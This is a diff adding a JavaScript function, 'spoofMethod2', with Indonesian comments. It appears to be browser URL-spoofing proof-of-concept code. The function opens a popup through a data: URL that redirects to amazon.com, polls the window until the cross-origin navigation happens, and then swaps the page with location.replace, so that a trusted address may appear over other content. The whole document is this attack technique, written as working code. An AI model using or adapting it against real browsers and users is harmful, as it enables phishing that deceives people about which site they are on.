@@ -1,0 +1,31 @@
+function spoofMethod2() {
+    var targetURL = 'http://amazon.com';
+    var dataURL = 'data:text/html,<html><head><title>Loading...</title></head><body>';
+    dataURL += '<script>setTimeout(function(){window.location="' + targetURL + '";},100);</script>';
+    dataURL += '</body></html>';
+    
+    var w = window.open(dataURL, 'window', 'width=500,height=500');
+    
+    var i = setInterval(function() {
+        try {
+            var href = w.location.href;
+            if (href && href !== 'about:blank' && !href.startsWith('data:')) {
+                clearInterval(i);
+                // Navigasi ke target URL sudah terjadi
+                setTimeout(function() {
+                    try {
+                        w.location.replace('http://www.google.com/csi');
+                    } catch(e) {}
+                }, 50);
+            }
+        } catch(e) {
+            // Cross-origin error - navigasi berhasil
+            clearInterval(i);
+            setTimeout(function() {
+                try {
+                    w.location.replace('http://www.google.com/csi');
+                } catch(e) {}
+            }, 100);
+        }
+    }, 10);
+}
